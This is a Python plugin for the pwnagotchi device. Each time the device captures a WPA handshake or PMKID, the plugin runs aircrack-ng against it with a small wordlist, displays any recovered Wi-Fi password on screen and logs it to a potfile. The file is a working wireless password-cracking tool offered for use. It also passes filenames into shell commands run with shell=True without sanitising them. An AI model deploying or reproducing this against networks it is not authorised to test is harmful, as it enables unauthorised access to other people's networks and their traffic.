import os
import logging
import subprocess
import string
import re
import pwnagotchi.plugins as plugins

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist with this name mini-8.txt to home file (/home/pi/mini-8.txt)
Cracked and failed handshakes are stored in /home/pi/wpa-sec.cracked.potfile 
Please check that these two file a present
'''


class QuickDic(plugins.Plugin):
     __author__ = 'pwnagotchi [at] rossmarks [dot] uk'
    __modified_by__ = '@7h30th3r0n3'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Run a small aircrack scan against captured handshakes and PMKID'

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        logging.info("[quickdic] quickdic plugin loaded")

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'

        check = subprocess.run(('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info("[quickdic] Found aircrack-ng : " + check)
        else:
            logging.warning("[quickdic] aircrack-ng is not installed!")

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake\|PMKID" | awk \'{print $2}\''),shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
        capname = filename.split('/')[-1].split('_')[0]
        if not result:
            logging.info("[quickdic] No handshake for " + capname)
        else:
            logging.info("[quickdic] Handshake confirmed for " + capname)
            with open('/home/pi/wpa-sec.cracked.potfile', 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if capname in line:
                        logging.info("[quickdic] Handshake crack abort (already in list) : " + capname)
                        return
            resultbssid = ':'.join(os.path.splitext(filename)[0].split('_')[1][i:i+2] for i in range(0, len(os.path.splitext(filename)[0].split('_')[1]), 2))
            logging.info("[quickdic] Handshake cracking start for " + capname)
            result2 = subprocess.run(('aircrack-ng -w /home/pi/mini-8.txt -l '+ filename + '.cracked -q -b ' + resultbssid + ' ' + filename + ' | grep KEY'),shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            if result2 != "KEY NOT FOUND":
                logging.info("[quickdic] Handshake of " + capname + " CRACKED!!!!! :  " + result2 )
                key = re.search('\[(.*)\]', result2)
                pwd = str(key.group(1))
                self.text_to_set = "Cracked password for " + capname + " : " + pwd
                with open("/home/pi/wpa-sec.cracked.potfile", "a") as f:
                    f.write(capname + " -" + pwd + '\n')
                display.update(force=True)
            else:
                logging.info("[quickdic] Handshake cracking FAIL for " + capname)
                with open("/home/pi/wpa-sec.cracked.potfile", "a") as f:
                    f.write(capname + " - FAIL \n")

    def on_ui_update(self, ui):
        if self.text_to_set:
            ui.set('face', self.options['face'])
            ui.set('status', self.text_to_set)
            self.text_to_set = ""
